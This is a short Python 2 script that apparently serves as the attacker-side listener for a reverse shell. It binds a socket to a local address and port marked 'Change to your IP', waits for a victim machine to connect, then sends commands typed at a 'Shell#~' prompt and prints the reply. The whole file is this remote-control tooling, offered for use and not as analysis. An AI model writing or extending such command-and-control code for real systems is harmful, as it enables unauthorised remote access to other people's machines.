#!/usr/bin/python

import socket


def shell():
    command = raw_input("Shell#~%s: "%str(ip))
    target.send(command)
    message = target.recv(1024)
    print(message)

def server():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("10.0.2.15",54321))#Change to your IP
    s.listen(5)

    print("[+] Listening for incoming connections")
    target, ip = s.accept()
    print("[+] Connection established From: %s" % str(ip))

server()
shell()
